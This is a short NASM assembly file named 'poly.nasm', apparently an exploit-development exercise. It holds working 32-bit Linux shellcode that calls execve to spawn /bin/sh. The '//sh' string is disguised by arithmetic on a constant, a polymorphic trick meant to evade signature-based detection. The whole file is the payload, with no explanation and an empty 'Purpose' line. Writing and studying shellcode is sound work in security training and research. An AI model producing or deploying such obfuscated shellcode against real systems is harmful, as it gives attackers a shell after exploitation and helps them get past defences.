; Filename: poly.nasm
;
;
;
; Purpose: 

global _start			

section .text
_start:


	; push the first null dword
	xor eax, eax
	push eax

	; push //bin/sh (8 bytes)

	mov esi, 0x57621e1e
	add esi, 0x11111111
	mov dword [esp -4], esi
	
	mov dword [esp -8], 0x6e69622f
	sub esp, 8

	mov ebx, esp
	push eax
	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
